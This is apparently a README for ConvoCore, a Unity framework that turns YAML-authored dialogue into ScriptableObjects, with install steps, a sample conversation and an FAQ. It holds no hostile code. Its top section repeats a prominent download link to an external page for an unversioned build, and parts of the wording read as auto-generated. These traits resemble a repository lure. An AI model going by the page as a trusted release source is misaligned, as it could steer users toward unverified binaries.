# ConvoCore - Unity Dialogue Framework 2026

> **ConvoCore is a modular, data-driven conversation system for Unity. It converts YAML-authored dialogue into ScriptableObjects, providing an editor-friendly workflow for managing narrative content at scale.**

[![Platform](https://img.shields.io/badge/Platform-Unity-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/andrewkrause7/convocore-yaml-dialogue?style=flat-square)](https://github.com/andrewkrause7/convocore-yaml-dialogue)

---

<p align="center">
  <a href="https://andrewkrause7.github.io/convocore-yaml-dialogue/">
    <img src="https://img.shields.io/badge/Download-ConvoCore%20Latest-brightgreen?style=for-the-badge" alt="Download ConvoCore">
  </a>
</p>

> **[Download ConvoCore](https://andrewkrause7.github.io/convocore-yaml-dialogue/)**

---

[Download Latest Build](https://andrewkrause7.github.io/convocore-yaml-dialogue/)

---

## Overview

ConvoCore separates conversation data from the way that conversation is displayed. Teams can write dialogue in YAML, convert it into Unity ScriptableObjects, and reuse the resulting content in projects with growing narrative requirements.

Its modular design supports multi-character exchanges, expressions, and actions connected to dialogue lines. Character presentation, user interface, input processing, and other framework areas can be extended or swapped without requiring the entire conversation workflow to change.

---

## What It Provides

- Write dialogue sources using YAML
- Generate Unity ScriptableObjects from conversation data
- Build exchanges between multiple characters
- Customize character representations for project-specific requirements
- Include expression systems in conversation sequences
- Trigger actions before or after individual dialogue lines
- Replace individual framework modules
- Use independent UI and input implementations

---

## Installation

Clone the repository somewhere your Unity project can access:

```bash
git clone https://github.com/andrewkrause7/convocore-yaml-dialogue.git
```

Open the `ConvoCore` directory in the Unity Editor or import it into the project. Once installed, place YAML dialogue files in the project and use the provided editor tools to compile those sources into ScriptableObject assets.

For a packaged release, download the latest build and use the Unity import directions included with that package.

---

## Getting Started

A standard authoring and compilation cycle looks like this:

1. Write the conversation source in YAML.
2. List the participants and define their lines.
3. Add expressions or line-specific hooks when interactive behavior is needed.
4. Compile the YAML through the Unity Editor into ScriptableObjects.
5. Link the generated conversation assets to the project's UI and input systems.
6. Extend or replace framework modules as the project requirements develop.

The following example shows a basic conversation layout:

```yaml
conversation:
  title: Greeting
  characters:
    - Guide
    - Player
  lines:
    - character: Guide
      text: Welcome.
    - character: Player
      text: Thanks for having me.
```

Available properties are determined by the dialogue data model configured for the project.

---

## Data and Component Configuration

YAML serves as ConvoCore's source format, while compiled ScriptableObjects provide the Unity-side representation. Keep the source files with the project's narrative assets and compile them using the editor tooling supplied by the framework.

The following areas can be adapted through ConvoCore's modular components:

- Character representations
- Expression processing
- Actions before a line
- Actions after a line
- User interface layers
- Input layers
- Additional replaceable subsystems

---

## Requirements

- Unity
- A Unity project capable of importing the ConvoCore files
- YAML files containing the dialogue source data
- Enough project storage for both source assets and compiled ScriptableObjects

The available project metadata does not specify any additional runtime or storage requirements.

---

## Frequently Asked Questions

### What kinds of teams use ConvoCore?

It is intended for Unity developers and narrative teams who need structured, editor-assisted management of multi-character dialogue.

### What is the authoring workflow?

Write the conversation in YAML, then compile that source into ScriptableObjects for use in Unity.

### Can a project provide its own UI and controls?

Yes. The UI and input layers are replaceable, so a project can connect its own presentation and interaction systems.

### Are custom character displays supported?

Yes. Character representations can be extended to change how participants are presented or managed.

### Where are project-specific changes made?

Store dialogue content in YAML source files. Configure runtime and presentation behavior through the appropriate modular components and Unity project assets.

### What can cause a conversation not to appear?

Check the YAML structure first, verify that the source was compiled into ScriptableObjects, and confirm that the generated assets are connected to the configured UI and input layers.

### How can I find newer versions?

Review the repository for later builds, editor tooling changes, and other framework updates.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
